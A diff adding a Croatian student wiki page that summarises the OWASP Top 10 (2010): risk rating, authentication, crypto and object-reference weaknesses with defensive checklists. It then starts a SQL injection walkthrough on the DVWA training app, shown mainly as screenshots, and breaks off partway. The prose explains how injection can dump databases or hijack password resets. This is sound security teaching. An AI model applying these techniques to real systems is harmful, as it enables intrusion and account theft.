@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>OWASP Top 10: Problemi autentikacije, kriptografije i referenci koda - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-OWASP_Top_10_Problemi_autentikacije_kriptografije_i_referenci_koda skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">OWASP Top 10: Problemi autentikacije, kriptografije i referenci koda</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#mw-head">orijentacija</a>,
+					<a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Tim: Ivan Marković, Franjo Špejić, Mladen Meštrić, Tomislav Matijak
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#OWASP_Top_10"><span class="tocnumber">2</span> <span class="toctext">OWASP Top 10</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#OWASP_Top_10-2010"><span class="tocnumber">2.1</span> <span class="toctext">OWASP Top 10-2010</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Metodologija_ra.C4.8Dunanja_rizika"><span class="tocnumber">2.2</span> <span class="toctext">Metodologija računanja rizika</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-5"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#OWASP_Top_10_2007_vs._OWASP_Top_10_2010"><span class="tocnumber">3</span> <span class="toctext">OWASP Top 10 2007 vs. OWASP Top 10 2010</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#OWASP_Top_10:_Problemi_autentikacije.2C_kriptografije_i_referenci_koda"><span class="tocnumber">4</span> <span class="toctext">OWASP Top 10: Problemi autentikacije, kriptografije i referenci koda</span></a>
+<ul>
+<li class="toclevel-2 tocsection-7"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Problem_autentikacije"><span class="tocnumber">4.1</span> <span class="toctext">Problem autentikacije</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Problem_kriptografije"><span class="tocnumber">4.2</span> <span class="toctext">Problem kriptografije</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Problem_referenci_koda"><span class="tocnumber">4.3</span> <span class="toctext">Problem referenci koda</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-10"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Prakti.C4.8Dni_dio"><span class="tocnumber">5</span> <span class="toctext">Praktični dio</span></a>
+<ul>
+<li class="toclevel-2 tocsection-11"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Injection_.28A1.29"><span class="tocnumber">5.1</span> <span class="toctext">Injection (A1)</span></a>
+<ul>
+<li class="toclevel-3 tocsection-12"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#SQL_Injection"><span class="tocnumber">5.1.1</span> <span class="toctext">SQL Injection</span></a></li>
+<li class="toclevel-3 tocsection-13"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#SQL_Injection_.28Blind.29"><span class="tocnumber">5.1.2</span> <span class="toctext">SQL Injection (Blind)</span></a></li>
+<li class="toclevel-3 tocsection-14"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#WebGoat_lekcije"><span class="tocnumber">5.1.3</span> <span class="toctext">WebGoat lekcije</span></a>
+<ul>
+<li class="toclevel-4 tocsection-15"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Command_Injection"><span class="tocnumber">5.1.3.1</span> <span class="toctext">Command Injection</span></a></li>
+<li class="toclevel-4 tocsection-16"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Blind_SQL_Injection"><span class="tocnumber">5.1.3.2</span> <span class="toctext">Blind SQL Injection</span></a></li>
+<li class="toclevel-4 tocsection-17"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Numeric_SQL_Injection"><span class="tocnumber">5.1.3.3</span> <span class="toctext">Numeric SQL Injection</span></a></li>
+<li class="toclevel-4 tocsection-18"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#String_SQL_Injection"><span class="tocnumber">5.1.3.4</span> <span class="toctext">String SQL Injection</span></a></li>
+<li class="toclevel-4 tocsection-19"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Za.C5.A1tita_od_umetanja_znakova"><span class="tocnumber">5.1.3.5</span> <span class="toctext">Zaštita od umetanja znakova</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-20"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Cross_site_scripting_.28A2.29"><span class="tocnumber">5.2</span> <span class="toctext">Cross site scripting (A2)</span></a>
+<ul>
+<li class="toclevel-3 tocsection-21"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Webgoat_lekcije_2"><span class="tocnumber">5.2.1</span> <span class="toctext">Webgoat lekcije</span></a>
+<ul>
+<li class="toclevel-4 tocsection-22"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#.22Phishing.22_s_XSS-om"><span class="tocnumber">5.2.1.1</span> <span class="toctext">"Phishing" s XSS-om</span></a></li>
+<li class="toclevel-4 tocsection-23"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Stored_XSS"><span class="tocnumber">5.2.1.2</span> <span class="toctext">Stored XSS</span></a></li>
+<li class="toclevel-4 tocsection-24"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Blokiranje_Store_XSS-a"><span class="tocnumber">5.2.1.3</span> <span class="toctext">Blokiranje Store XSS-a</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-25"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Broken_authentication_.28A3.29"><span class="tocnumber">5.3</span> <span class="toctext">Broken authentication (A3)</span></a>
+<ul>
+<li class="toclevel-3 tocsection-26"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Webgoat_lekcije_3"><span class="tocnumber">5.3.1</span> <span class="toctext">Webgoat lekcije</span></a>
+<ul>
+<li class="toclevel-4 tocsection-27"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Lekcija_1-_Ja.C4.8Dina_passworda"><span class="tocnumber">5.3.1.1</span> <span class="toctext">Lekcija 1- Jačina passworda</span></a></li>
+<li class="toclevel-4 tocsection-28"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Lekcija_2-_Povratak_passworda"><span class="tocnumber">5.3.1.2</span> <span class="toctext">Lekcija 2- Povratak passworda</span></a></li>
+<li class="toclevel-4 tocsection-29"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Lekcija_3-_Provjera_autenti.C4.8Dnosti"><span class="tocnumber">5.3.1.3</span> <span class="toctext">Lekcija 3- Provjera autentičnosti</span></a></li>
+<li class="toclevel-4 tocsection-30"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Lekcija_4-_Vi.C5.A1e_razina_prijave_-_1_dio"><span class="tocnumber">5.3.1.4</span> <span class="toctext">Lekcija 4- Više razina prijave - 1 dio</span></a></li>
+<li class="toclevel-4 tocsection-31"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Lekcija_4-_Vi.C5.A1e_razina_prijave_-_2_dio"><span class="tocnumber">5.3.1.5</span> <span class="toctext">Lekcija 4- Više razina prijave - 2 dio</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-32"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Insecure_direct_object_references_.28A4.29"><span class="tocnumber">5.4</span> <span class="toctext">Insecure direct object references (A4)</span></a></li>
+<li class="toclevel-2 tocsection-33"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Cross_Site_Request_Forgery_.28A5.29"><span class="tocnumber">5.5</span> <span class="toctext">Cross Site Request Forgery (A5)</span></a></li>
+<li class="toclevel-2 tocsection-34"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Security_Misconfiguration_.28A6.29"><span class="tocnumber">5.6</span> <span class="toctext">Security Misconfiguration (A6)</span></a></li>
+<li class="toclevel-2 tocsection-35"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Failure_to_Restrict_URL_Access_.28A8.29"><span class="tocnumber">5.7</span> <span class="toctext">Failure to Restrict URL Access (A8)</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-36"><a href="./OWASP_Top_10:_Problemi_autentikacije,_kriptografije_i_referenci_koda.html#Literatura"><span class="tocnumber">6</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> <center><b>Uvod</b></center> </span></h2>
+<p>Iz dana u dan sve češće možemo pročitati da poduzeća muku muče sa hakerima koji im probijaju sustav i rade neopisive štete. Posljednji takav primjer je Sony gdje su hakeri napravili veliku štetu. Upravo zbog toga se razvio OWASP. Organizacije su sa OWASP-om dobile jako puno, dobile su mogućnost naučiti i pripremiti se za prijetnje kojima su svakodnevno izložene, dobili su mogućnost, na temelju toga, školovati stručnjake kako bi prijetnje sveli na minimum, jer nitko ne može garantirati potpunu sigurnost. OWASP je relativno mlad, ali svojom pojavom je spasio mnoge organizacije, a svojom predanošću iz dana u dan postaje sve bolji.
+Kako će se sve više i više koristiti internet kao sredstvo poslovanja, tako će organizacije biti sve češće metom napada. Kako će tehnologija napredovati, otvorit će se novi oblici napada koji su možda nama sad nezamislivi, a time će napadači biti sve pametniji, što će uvelike otežati posao onima koji se bave sigurnošću.
+Uvijek će postojati borba hakera i organizacija, te je samo  pitanje tko će spremniji ući u bitku. Ipak bi u toj borbi dao malu prednost napadačima jer je u ovom slučaju lakše napadati nego se braniti, a ako je netko zapeo da napravi neku štetu, bez obzira na sve, vrlo vjerojatno će u tome uspjeti, jer je ne moguće pokrpati sve rupe brzinom kojom ih napadač otkriva.<br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 15:32, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="OWASP_Top_10"> <b><center>OWASP Top 10</center></b>  </span></h2>
+<p>OWASP (The Open Web Application Security Project) Top 10 ima za cilj, kako oni sami kažu, povećati svjesnost o sigurnosti aplikacija, a to se postiže tako da se identificiraju najkritičniji rizici s kojima se svaka organizacija susreće . Tu ne bih uključio samo organizacije, već bi tu uključio i sve koji imaju doticaje sa internetom, bilo da ga koriste za zabavu, bilo da ga koriste za posao, jer svi možemo biti meta istog napada. Ono što je bitno naglasiti za OWASP, a kako oni sami kažu, je to da OWASP ne nudi rješenje kako neki sigurnosni problem riješiti, već upućuje na moguće rizike sa kojima se organizacije mogu suočiti i potiče školovanje i zapošljavanje stručnjaka iz tog područja kako bi se organizacije koliko toliko uspjele zaštiti od napada putem interneta. Također nudi i praktične primjere loših aplikacija i mehanizama kako bi se postigla svjesnost da ako već idemo nešto raditi, da radimo kako spada, a ne da se kupuje ili isporučuje polovični proizvod.
+Kako bi to bilo dostupno svima i kako bi svi bili svjesni opasnosti koja nam prijeti na internetu, OWASP besplatno nudi:
+</p>
+<ul><li> 	Standarde i alate za sigurnost aplikacija
+</li><li> 	Cjelovite knjige o testiranju sigurnosti aplikacija, o sigurnosti razvoja aplikacije
+</li><li> 	Vrhunska istraživanja
+</li><li> 	Konferencije po cijelom svijetu 
+</li></ul>
+<p>OWASP Top 10 se prvi put pojavio 2003. godine, da bi 2004. godine doživio male izmjene. Takav se zadržao do 2007. godine, kad je doživio značajnije promjene. Najnovija verzija OWASP Top 10 je izašla 2010. godine kada su novi sigurnosni rizici postali velika prijetnja organizacijama. <br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 15:32, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="OWASP_Top_10-2010"> <b><center>OWASP Top 10-2010</center></b> </span></h3>
+<p>OWASP Top 10-2010 predstavlja 10 najkritičnijih web aplikacijskih sigurnosnih rizika, a obuhvaća:
+</p>
+<ol><li>	Injection
+</li><li>	Cross-Site Scripting(XSS)
+</li><li>	Broken Authentication and Session Managment
+</li><li>	Insecure Direct Object References
+</li><li>	Cross Site Request Forgery(CSRF)
+</li><li>	Security Misconfiguration
+</li><li>	Failure to Restrict URL Access
+</li><li>	Insecure Cryptographic Storage
+</li><li>	Insufficient Trasnport Layer Protection
+</li><li>	Unvalidated Redirects and Forwards 
+</li></ol>
+<p>Potrebno je naglasiti da to nisu jedini rizici koji postoje. Postoji još mnogo drugih rizika koji su isto prijetnja, ali ovi su najučestaliji i od njih prijeti najveća opasnost. Također je potrebno naglasiti kako će napredovati tehnologija i znanje ljudi, pojavljivat će se i novi sigurnosni rizici, još opasniji i još teži za spriječiti, te ova lista nikako nije konačna i sa godinama će doživjeti značajne promjene. <br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 15:32, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Metodologija_ra.C4.8Dunanja_rizika"> <b><center>Metodologija računanja rizika</center></b> </span></h3>
+<p>U OWASP-u Top 10-2010 se prvi put pojavljuje metodologija izračuna rizika, dok su je u prijašnjim verzijama fokus bio samo na identificiranju ranjivosti. Prije nego što počnemo išta pisati o metodologiji, potrebno je naglasiti da svaka organizacija može sebi prilagoditi taj izračun, kako njoj odgovara, a temelji se na izračun koji će biti prikazan ovdje. 
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Razliciti_putevi.gif" class="image"><img alt="Razliciti putevi.gif" src="../images/3/38/Razliciti_putevi.gif" width="720" height="247" /></a></center>
+<p>Slika ukazuje na to da napadač ima više puteva kroz koje može prolaziti prilikom izvršavanja napada, a svaki taj put ima svoj stupanj rizika, odnosno ovisi kojim putem napadač ide, rizik može biti veći ili manji, a to ovisi od organizacije do organizacije, te je zbog toga napomenuto da svaka organizacija prilagođava izračun rizika kako njoj odgovara. Na temelju toga radimo tablicu vjerojatnosti.
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Rizici1.GIF" class="image"><img alt="Rizici1.GIF" src="../images/d/d4/Rizici1.GIF" width="500" height="211" /></a></center>
+<p>Vidimo da svaki stupac u tablici ima 3 stupnja vjerojatnosti ponderirana od 1 do 3, gdje 1 predstavlja najmanju vjerojatnost, a 3 najveću. Na slici također vidimo primjer izračuna težine rizika. Ako uzmemo da je napadač išao putem  kao što je prikazano na slici, a na tom putu je Attack Vector jednak1, Weakness Prevalence jednak 2, Weakness Detectability jednak 2 i Tehical Impact jednak 1, to znači da je težina rizika jednaka 1.66 je po „defaultu“ niska razina rizika, ali kao što je više puta naglašeno, taj broj treba uzeti sa rezervom jer svaka organizacija sebi prilagođava izračun rizika. Kako se došlo do tog rezultata? <br />
+<i><b>Razina rizika=((AttackVector+WeaknessPrevalence+WeaknessDetectability)/3)*TehnicalImpact</b></i> <br />
+</p><p><i><b>U našem slučaju: Razina rizika= ((1+2+2)/3)*1=1,66</b></i>
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Vjerojatnost.gif" class="image"><img alt="Vjerojatnost.gif" src="../images/c/c9/Vjerojatnost.gif" width="428" height="103" /></a></center>
+<p>Ako je dobivena razina rizika od 0-2.9, tada je rizik malen, ako je razina rizika od 3-5.9, tada je rizik srednji, a ako je razina rizika od 6-9, tada je rizik visok. <br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 16:14, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="OWASP_Top_10_2007_vs._OWASP_Top_10_2010"> <b><center>OWASP Top 10 2007 vs. OWASP Top 10 2010</center></b> </span></h2>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:2010vs2007.GIF" class="image"><img alt="2010vs2007.GIF" src="../images/d/d5/2010vs2007.GIF" width="568" height="376" /></a></center>
+<p>Sa slike vidimo da postoji dosta značajnih promjena. Tako vidimo da se u odnosu na 2007. godinu Injection pomakao na prvo mjesto, a također su napredovali Broken Authentication and Session Managment, Insecure Cryptographic Storage i Failure to Restrict URL Access. Malicious File Execution koji je bio na trećem mjestu u OWASP Top 10-2007 i Information Leakage and Improper Error Handling koji je bio na šestom mjestu, su izostavljeni u OWASP Top 10-2010. Također, XSS je pao na drugo mjesto, a dodana su i dva  nova rizika, Unvalidated Redirects and Forwards i to na deseto mjesto, te Security Misconifiguration i to na dosta visoko šesto mjesto.
+Vidimo da postoji dosta velika razlika između 2007. godine i 2010. godine, što samo potkrepljuje tvrdnju da će iz godine u godinu nastajati novi rizici koji će stvarati probleme, te će se na temelju toga i OWASP Top 10 mjenjati. Napadači će postajati sve opasniji i opasniji, te će oni koji se bave sigurnošću morati biti u koraku sa njima, ukoliko žele rizike svesti na minimum, jer potpunu sigurnost nam nitko nikada ne može jamčiti, niti će ikada moći. <br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 16:19, 5. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="OWASP_Top_10:_Problemi_autentikacije.2C_kriptografije_i_referenci_koda"> <b><center>OWASP Top 10: Problemi autentikacije, kriptografije i referenci koda</center> </b></span></h2>
+<h3> <span class="mw-headline" id="Problem_autentikacije"> <b><center>Problem autentikacije</center></b> </span></h3>
+<p>Problem autentikacije je jedna od najvažnijih stvari u sigurnosti web aplikacija, te je to dosta bitno naglasiti. Pukotine koje ovdje nastaju najčešće se odnose na nemogućnst zaštite korisničkih podataka i session tokena. To dovodi do toga da napadači kradu račune od korisnika ili samih administratora te tako narušavaju privatnost i rade kaznena dijela. Napadači ne moraju nužno biti anonimni vanjski subjekti, mogu to biti sasvim legalni korisnici koji koriste određene propuste kako bi zamaskirali svoje djelovanje ili došli do viših razina privilegija. Najčešći uzrok ovih nedostataka je naravno ljudska greška, odnosno nedovoljna razina znanja pri implementiranju vlastitih sustava provjere korisnika. Kada se razvijaju vlastiti sustavi često se nešto previdi te ostavi sigurnosnu rupu.
+<br />
+Jesmo li ranjivi? <br />
+</p>
+<ul><li>	Jesu li korisnički podaci uvjek zaštičeni kada su spremljeni pomoću hash-a i enkripcije
+</li><li>	Mogu li podaci biti pogođeni ili prevrisani kroz slabe upravljačke funkcije accounta (izrada accounta, promjena passworda, povratak passworda)
+</li><li>	Je li session ID izložen u URL-u
+</li><li>	Odlaze li session ID u timeout i mogu li se korisnici odjaviti
+</li></ul>
+<p>Kako se obraniti od toga?
+</p>
+<ul><li>	Verificiranjem arhitekture
+<ul><li>	Autentikacija treba biti jednostavna, standardizirana i centralizirana
+</li><li>	SSL treba, cijelo vrijeme, štititi i korisničke podatke i session id
+</li></ul>
+</li><li>	Verificiranjem implementacije
+<ul><li>	Provjeriti SSL certifikat
+</li><li>	Ispitati sve funkcije vezane za autentikaciju
+</li><li>	Provjeriti da logoff stvarno uništava sesiju <br />
+</li></ul>
+</li></ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 19:26, 5. siječnja 2012. (CET)
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 18:48, 6. siječnja 2012. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Problem_kriptografije"> <b><center>Problem kriptografije</center></b> </span></h3>
+<p>Problem kriptografije se događa kada aplikacija svoje podatke ne kriptira sigurno kada su pohranjeni u bazu podataka. To je čest slučaj, pa se događa da napadači vrlo lako mogu doći do osjetljivih podataka i manipulirati njima.
+Najčešće greške koje vode nesigurnoj kriptografiji:
+</p>
+<ul><li>	Developeri ne kriptiraju podatke koji su pohranjeni u bazu podataka
+</li><li>	Developeri kriptiraju podatke koji su pohranjeni u bazu podataka, ali se oslanjaju na svoje metode enkripcije, odnosno one koje su oni razvili
+</li></ul>
+<p>Jesmo li ranjivi?
+</p>
+<ul><li>	Jesu li svi podaci, osjetljivi i manje osjetljivi, kriptirani, bilo gdje da se nalaze
+</li><li>	Samo autorizirani korisnici mogu pristupiti dekriptiranim podacima
+</li><li>	Je li korištena jaka enkripcija
+</li><li>	Je li ključ zaštićen od neautoriziranog pristupa
+</li></ul>
+<p>Kako se obraniti od toga?
+</p>
+<ul><li>	Zaštititi sve podatke koji su nam bitni i koji mogu napraviti veliku štetu ukoliko napadač dođe do njih
+</li><li>	Osigurati jak algoritam kriptiranja i jak ključ
+</li><li>	Osigurati da su passwordi zaštićeni jakim algoritmom
+</li><li>	Osigurati da su svi ključevi i passwordi zaštićeni od neautoriziranog pristupa <br />
+</li></ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 19:59, 5. siječnja 2012. (CET)
+</p>
+<h3> <span class="mw-headline" id="Problem_referenci_koda"> <b><center>Problem referenci koda</center></b> </span></h3>
+<p>Problem referenci koda se događa kad developer, preko URL-a ostavi referencu na unutrašnji objekt, kao što je file, direktorij, ključ. Tada napadač može pristupiti tim objektima bez autorizacije i manipulirati njima.
+Jesmo li ranjivi?
+</p>
+<ul><li>	Za direktnu referencu na ograničene resurse, aplikacija mora provjeriti da je korisnik autoriziran i da ima pristup tim resursu
+</li><li>	Ako je referenca indirektna, mapiranje do direktne reference mora biti ograničeno na korisnika koji ima pravo na to, te ne nikoga drugog
+</li></ul>
+<p>Kako se obraniti?
+</p>
+<ul><li>	Izbjegavati izlaganje referenci na privatne objekte korsinicima, kad god je to moguće
+</li><li>	Verificirati autorizaciju na svim referenciranim objektima
+</li><li>	Osigurati da input ne sadrži put kojim bi napadač mogao probijati, kao što je ../ or <br />
+</li></ul>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Franjo.spejic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Franjo.spejic (stranica ne postoji)">Franjo.spejic</a> 20:37, 5. siječnja 2012. (CET)
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Prakti.C4.8Dni_dio"> <center><b>Praktični dio</b></center></span></h2>
+<h3> <span class="mw-headline" id="Injection_.28A1.29"><b>Injection (A1)</b> </span></h3>
+<p>SQL Injection je način kojim se napadač koristi kako bi pomoću  forme za unos koja nije dovoljno dobro zaštićena iskoristio ranjivost sustava, tako što koristi tu formu kako bi izvršavala SQL naredbe koje on želi. Za ovu vrstu napada dovoljan je obični web preglednik, te otvoreni port 80 na poslužitelju, i naravno baza, te forma za unos. Posljedice koje su uzrokovane ovom vrstom napada na sustav su velike i najčešće rezultiraju kopiranjem cijele baze napadaču čime on dobiva sve ili skoro sve podatke o korisnicima, ovisno koliko se potrudi, tj. koliko podataka mu je potrebno. To može biti username i/ili password, ili samo ubacivanje (update) napadačeve email adrese umjesto postojeće email adrese korisnika kako bi se privremena lozinka poslala na napadačev email i time je već osigurao ulaz u sustav. U praktičnom dijelu biti će prikazan SQL injection i SQL blind injection na DVWA aplikaciji. Razlika između "običnog" i blind sql injection-a je u tome što web aplikacije koje žele barem malo otežati posao napadaču ne prikazuju rezultat injectiona, dok se kod "običnog" vidi odgovor (error) za svaki krivi unos, tj. upit i time se može olakšati pogađanje nekih informacija poput imena tablice, stupaca, itd. Zbog toga je ponekad potrebno dosta vremena potrošiti na početno pogađanje točnog upita, ali aplikacija je i dalje jednako ranjiva jednom kada se pronađe/pogodi koristan podatak.
+</p>
+<h4> <span class="mw-headline" id="SQL_Injection"><b>SQL Injection</b> </span></h4>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:I1_proba.PNG" class="image"><img alt="I1 proba.PNG" src="../images/4/4f/I1_proba.PNG" width="663" height="195" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:I_proba3.PNG" class="image"><img alt="I proba3.PNG" src="../images/8/89/I_proba3.PNG" width="660" height="192" /></a></div></div>
+<p><br />
+Na ovim slikama vidimo unošenje ID-a, 1 i 3, te ispis imena i prezimena koji pripadaju tom ID-u, aplikacije je namijenjena da se tako koristi. Kroz sljedeće primjere biti će isprobani razni upiti kako bi se provjerilo kako izgleda upit, te što "prolazi", a što ne.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:1_je_ok.PNG" class="image"><img alt="1 je ok.PNG" src="../images/7/7b/1_je_ok.PNG" width="661" height="189" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:1_i_2_prosli.PNG" class="image"><img alt="1 i 2 prosli.PNG" src="../images/3/3b/1_i_2_prosli.PNG" width="669" height="191" /></a></div></div>
+<p><br />
+"Ranjivi" upit.
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Low_injection.PNG" class="image"><img alt="Low injection.PNG" src="../images/7/70/Low_injection.PNG" width="592" height="63" /></a></div></div>
+<p><br />
+Pokušaj "pogađanja", tj. ispitivanja upita da vidimo gdje se nalazimo.
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Pokusaj_s_a.PNG" class="image"><img alt="Pokusaj s a.PNG" src="../images/a/ab/Pokusaj_s_a.PNG" width="664" height="198" /></a></div></div>
+<p><br />
